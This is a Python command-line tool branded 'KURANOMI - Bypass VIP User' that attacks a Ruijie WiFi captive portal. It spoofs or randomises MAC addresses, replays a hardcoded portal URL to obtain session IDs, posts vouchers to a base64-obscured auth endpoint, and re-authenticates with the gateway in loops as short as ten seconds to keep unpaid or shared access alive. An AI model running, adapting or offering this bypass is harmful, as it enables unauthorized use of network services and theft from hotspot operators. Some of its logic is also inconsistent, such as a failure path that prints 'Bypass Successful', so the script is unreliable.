import re
import requests
import base64
import os
import json
import asyncio
import time
import socket
import random
import urllib3
from ping3 import ping

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== FIXED URL  ====================
FIXED_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=9cce8804f145&gw_sn=H1U50ZK003151&gw_address=192.168.80.1&gw_port=2060&ip=192.168.85.164&mac=52:49:83:aa:fb:23&slot_num=24&nasip=100.122.152.187&ssid=VLAN80&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C007&chap_challenge=%5C352%5C276%5C377%5C021%5C263%5C144%5C033%5C314%5C321%5C377%5C363%5C216%5C321%5C230%5C030%5C335"

# ==================== AUTO DETECT FUNCTIONS ====================

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except:
        return "192.168.110.1"

def fetch_portal_url():
    """Auto detect - MAC နဲ့ Gateway ဖမ်းဖို့အတွက်ပဲ သုံးမယ်"""
    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254"]
    gateways = list(dict.fromkeys(gateways))
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        'Accept': '*/*'
    }

    for gw in gateways:
        target = f"http://{gw}"
        try:
            res = requests.get(target, headers=headers, timeout=5, allow_redirects=True)
            
            if "portal-as.ruijienetworks.com" in res.url:
                return res.url, gw
                
            match = re.search(r"href=['\"](.*?)['\"]", res.text)
            if match and "portal-as.ruijienetworks.com" in match.group(1):
                extracted = match.group(1)
                if extracted.startswith("http"):
                    return extracted, gw
                else:
                    return "https://portal-as.ruijienetworks.com" + extracted, gw
        except:
            continue
    
    return None, None

def extract_mac_from_url(url):
    match = re.search(r'mac=([^&]+)', url)
    if match:
        return match.group(1)
    return None

def extract_gw_ip_from_url(url):
    match = re.search(r'gw_address=([^&]+)', url)
    if match:
        return match.group(1)
    return None

def auto_get_settings():
    """MAC နဲ့ Gateway IP ကို auto ဖမ်းမယ် """
    portal_url, gw_ip = fetch_portal_url()
    
    if portal_url:
        mac = extract_mac_from_url(portal_url)
        gw = extract_gw_ip_from_url(portal_url) or gw_ip
        
        if mac and gw:
            return mac, gw  # URL ကို မပြန်တော့ဘူး
    
    # Fallback
    fallback_mac = "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )
    return fallback_mac, gw_ip

# ==================== CONFIG ====================
CONFIG_FILE = "config_kuranomiprojectSYnX.json"

# ==================== COLORS ====================
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
w = "\033[0m"
c = "\033[1;36m"

# ==================== GLOBALS ====================
auto_loop_running = False
loop_interval = 240
internet_connected = False
last_ping_time = 0
ping_history = []

user_mac = ""
user_voucher = ""
user_gateway = ""

# ==================== UTILITY ====================
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print("\033[1;31m" + "="*56)
    print("\033[1;31m  ██╗  ██╗██╗   ██╗██████╗  █████╗ ███╗   ██╗ ██████╗ ███╗   ███╗██╗\033[0m")
    print("\033[1;31m  ██║ ██╔╝██║   ██║██╔══██╗██╔══██╗████╗  ██║██╔═══██╗████╗ ████║██║\033[0m")
    print("\033[1;31m  █████╔╝ ██║   ██║██████╔╝███████║██╔██╗ ██║██║   ██║██╔████╔██║██║\033[0m")
    print("\033[1;31m  ██╔═██╗ ██║   ██║██╔══██╗██╔══██║██║╚██╗██║██║   ██║██║╚██╔╝██║██║\033[0m")
    print("\033[1;31m  ██║  ██╗╚██████╔╝██║  ██║██║  ██║██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██║\033[0m")
    print("\033[1;31m  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═╝\033[0m")
    print("\033[1;31m" + "="*56 + "\033[0m")
    print("\033[0m          KURANOMI - Bypass VIP User \033[0m")
    print("\033[1;36m       Developer: @Kuranomi10\033[0m")
    print("\033[1;31m" + "="*56 + "\033[0m")

def show_menu():
    print("\n" + "="*56)
    print("\033[1;33m[ MODE SELECTION ]\033[0m")
    print("  \033[1;32m[1]\033[0m 🖕 Kill Mode (10s)")
    print("  \033[1;34m[2]\033[0m 📱 Gaming Mode (180s)")
    print("  \033[1;36m[3]\033[0m ⭐ Stable Mode (420s)")
    print("  \033[1;36m[4]\033[0m 📈 Super Stable (240s)")
    print("  \033[1;31m[5]\033[0m 🔄 Change Voucher")
    print("  \033[1;31m[6]\033[0m 🚪 Exit")
    print("="*56)

# ==================== CONFIG ====================
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_config(mac_address, voucher, gateway_ip):
    config = {
        "mac_address": mac_address,
        "voucher": voucher,
        "gateway_ip": gateway_ip
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

# ==================== BYPASS CORE (FIXED_URL ကိုပဲ သုံးမယ်) ====================
def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

def get_session_id(session_url, mac_address):
    if not session_url:
        return None
    final_url = replace_mac(session_url, mac_address)  # Fixed URL ထဲက MAC ကို အသစ်နဲ့အစားထိုး
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        response = requests.get(final_url, headers=headers, timeout=10)
        session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response.url)
        if session_id:
            return session_id.group(1)
        return None
    except:
        return None

def login_voucher(session_id, voucher):
    data = {
        "accessCode": voucher,
        "sessionId": session_id,
        "apiVersion": 1
    }
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "content-type": "application/json",
        "user-agent": 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        response = requests.post(post_url, json=data, headers=headers, timeout=10)
        res_text = response.text
        if 'error' in res_text.lower() or 'invalid' in res_text.lower():
            return None, res_text
        token_match = re.search('token=(.*?)&', res_text)
        if token_match:
            return token_match.group(1), None
        return None, res_text
    except Exception as e:
        return None, str(e)

def do_bypass(mac_address, voucher, gateway_ip):
    """FIXED_URL ကိုပဲ သုံးမယ်"""
    session_id = get_session_id(FIXED_URL, mac_address)
    print(f"{c}[+] Session ID: {session_id}{w}")
    if not session_id:
        print(f"{r}[✗] Failed to get session ID{w}")
        return False
    
    active_session_id, error_msg = login_voucher(session_id, voucher)
    if not active_session_id:
        print(f"{r}[✗] Bypass Successful {w}")
        return False
    
    print(f"{c}[+] Active Token: {active_session_id}{w}")
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    params = {
        'token': active_session_id,
        'phoneNumber': 'KuranomiUser',
    }
    
    try:
        final_req_url = f'http://{gateway_ip}:2060/wifidog/auth?'
        response = requests.get(final_req_url, params=params, headers=headers, timeout=10)
        response_url = response.url
        
        success_conditions = [
            "http://www.baidu.com",
            "http://portal-as.ruijienetworks.com/download/static/maccauth/src/success.html",
            "success"
        ]
        
        if any(cond in response_url for cond in success_conditions):
            print(f"{g}[✓] Bypass Successful!{w}")
            return True
        else:
            print(f"{y}[!] Bypass may have succeeded, checking internet...{w}")
            return True
    except Exception as e:
        print(f"{r}[✗] Auth error: {e}{w}")
        return False

# ==================== PING & STATUS ====================
async def get_smart_ping():
    global internet_connected, last_ping_time, ping_history
    
    targets = ["google.com", "8.8.8.8", "cloudflare.com"]
    
    print("\n" + "="*56)
    print("  📶 Real-Time Internet Status")
    print("="*56)
    
    connected = False
    best_result = None
    best_latency = 9999
    
    for target in targets:
        try:
            ping_result = await asyncio.to_thread(ping, target, timeout=2)
            if ping_result is not None:
                ping_ms = int(ping_result * 1000)
                connected = True
                if ping_ms >= 150:
                    color = r
                    status = "🔴 Poor"
                elif ping_ms >= 80:
                    color = y
                    status = "🟡 Fair"
                else:
                    color = g
                    status = "🟢 Excellent"
                
                print(f"  {color}✓{w} {target:15} → {color}{ping_ms:>4} ms{w}  {status}")
                
                if ping_ms < best_latency:
                    best_latency = ping_ms
                    best_result = f"{color}{ping_ms} ms ({target}){w}"
            else:
                print(f"  {r}✗{w} {target:15} → {r}Timeout{w}")
        except:
            print(f"  {r}✗{w} {target:15} → {r}Error{w}")
    
    print("="*56)
    
    internet_connected = connected
    last_ping_time = time.time()
    if connected:
        ping_history.append(best_latency)
        if len(ping_history) > 10:
            ping_history.pop(0)
    
    if connected:
        print(f"\n  {g}✅ Internet Connected!{w}")
        return best_result if best_result else f"{g}Connected{w}"
    else:
        print(f"\n  {r}❌ No Internet Connection{w}")
        return f"{r}Offline{w}"

def get_internet_status():
    global internet_connected
    try:
        result = ping("8.8.8.8", timeout=2)
        internet_connected = result is not None
        return internet_connected
    except:
        internet_connected = False
        return False

# ==================== AUTO LOOP ====================
async def auto_loop_bypass(mac_address, voucher, gateway_ip, mode="gaming"):
    global auto_loop_running, loop_interval
    
    auto_loop_running = True
    loop_count = 0
    
    if mode == "kill":
        loop_interval = 10
        mode_name = "💀 Kill Mode"
    elif mode == "gaming":
        loop_interval = 180
        mode_name = "🎮 Gaming Mode"
    elif mode == "stable":
        loop_interval = 420
        mode_name = "🛡️ Stable Mode"
    elif mode == "super":
        loop_interval = 240
        mode_name = "⭐ Super Stable"
    else:
        loop_interval = 240
        mode_name = "🔄 Auto Mode"
    
    print("\n" + "="*56)
    print(f"  🔄 {mode_name}")
    print(f"  ⏱️  Interval: {loop_interval} seconds")
    print("  ⏹️  Press Ctrl+C to stop")
    print("="*56)
    
    while auto_loop_running:
        loop_count += 1
        print(f"\n{'='*56}")
        print(f"  🔄 Loop #{loop_count} - {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  📡 Mode: {mode_name}")
        print(f"{'='*56}")
        
        do_bypass(mac_address, voucher, gateway_ip)  # FIXED_URL ကို function ထဲမှာပဲ သုံးထားတယ်
        await get_smart_ping()
        
        print(f"\n  ⏳ Waiting {loop_interval} seconds...")
        wait_steps = max(1, loop_interval // 10)
        for i in range(loop_interval, 0, -wait_steps):
            if not auto_loop_running:
                break
            status = "🌐 Online" if get_internet_status() else "📴 Offline"
            print(f"  ⏱️  {i}s remaining | {status}")
            await asyncio.sleep(wait_steps)
    
    print("\n  🛑 Auto loop stopped.")

# ==================== USER INPUT ====================
def get_user_inputs():
    global user_mac, user_voucher, user_gateway
    
    config = load_config()
    
    # Auto detect (MAC နဲ့ Gateway အတွက်ပဲ)
    print(f"{y}[*] Auto-detecting network settings...{w}")
    mac, gw = auto_get_settings()
    
    if mac and gw:
        print(f"{g}[✓] Detected MAC: {mac}{w}")
        print(f"{g}[✓] Detected Gateway: {gw}{w}")
    else:
        mac = "02:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )
        gw = "192.168.110.1"
        print(f"{y}[!] Auto-detect failed. Using fallback values.{w}")
    
    old_mac = config.get("mac_address", mac)
    old_voucher = config.get("voucher", "")
    old_ip = config.get("gateway_ip", gw)
    
    user_mac = old_mac
    user_gateway = old_ip
    
    print("\n" + "="*56)
    print(f"{c}[ Current Settings ]{w}")
    print(f"  📌 MAC: {user_mac}")
    print(f"  📌 Gateway: {user_gateway}")
    print("="*56)
    
    if old_voucher:
        print(f"{c}[ Saved Voucher ]: {old_voucher}{w}")
    voucher = input(f"{g}Enter Voucher Code: {w}").strip() or old_voucher
    
    if not voucher:
        print(f"{r}[✗] Voucher required!{w}")
        return None, None, None
    
    save_config(user_mac, voucher, user_gateway)
    user_voucher = voucher
    
    print(f"{g}[✓] Settings saved!{w}")
    return user_mac, voucher, user_gateway

def start_bypass(mode="gaming"):
    global user_mac, user_voucher, user_gateway
    
    clear_screen()
    banner()
    
    print("\n" + "="*56)
    print(f"{c}[ Current Settings ]{w}")
    print(f"  📌 MAC: {user_mac[:8]}...{user_mac[-5:]}")
    print(f"  📌 Gateway: {user_gateway}")
    print("="*56)
    
    print(f"\n{y}[*] Starting bypass with FIXED_URL...{w}")
    
    do_bypass(user_mac, user_voucher, user_gateway)
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(get_smart_ping())
        loop.close()
    except Exception as e:
        print(f"\n{r}[-] Ping Error: {e}{w}")
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(auto_loop_bypass(user_mac, user_voucher, user_gateway, mode))
        loop.close()
    except KeyboardInterrupt:
        print("\n\n  🛑 Stopped by user.")
    except Exception as e:
        print(f"\n{r}[-] Auto loop error: {e}{w}")
    
    input("\nPress Enter to continue...")

# ==================== MAIN ====================
def main():
    global user_mac, user_voucher, user_gateway
    
    clear_screen()
    banner()
    mac, voucher, gw = get_user_inputs()
    
    if not mac or not voucher or not gw:
        print(f"\n{r}[-] Voucher is required. Exiting...{w}")
        time.sleep(2)
        return
    
    while True:
        clear_screen()
        banner()
        
        print("\n" + "="*56)
        print(f"{c}[ Current Settings ]{w}")
        print(f"  📌 MAC: {user_mac[:8]}...{user_mac[-5:]}")
        print(f"  📌 Voucher: {user_voucher}")
        print(f"  📌 Gateway: {user_gateway}")
        print("="*56)
        
        show_menu()
        
        choice = input(f"\n{g}Select option (1-6): {w}").strip()
        
        if choice == "1":
            start_bypass("kill")
        elif choice == "2":
            start_bypass("gaming")
        elif choice == "3":
            start_bypass("stable")
        elif choice == "4":
            start_bypass("super")
        elif choice == "5":
            clear_screen()
            banner()
            print(f"{y}[+] Change Voucher{w}")
            print("="*56)
            new_voucher = input(f"{g}New Voucher Code: {w}").strip()
            if new_voucher:
                save_config(user_mac, new_voucher, user_gateway)
                user_voucher = new_voucher
                print(f"{g}[✓] Voucher updated!{w}")
                time.sleep(1)
            else:
                print(f"{r}[✗] Voucher cannot be empty{w}")
                time.sleep(1)
        elif choice == "6":
            print(f"\n{c}Good Bye! See you again.{w}")
            break
        else:
            print(f"{r}[-] Invalid option. Choose 1-6.{w}")
            time.sleep(1)

if __name__ == "__main__":
    main()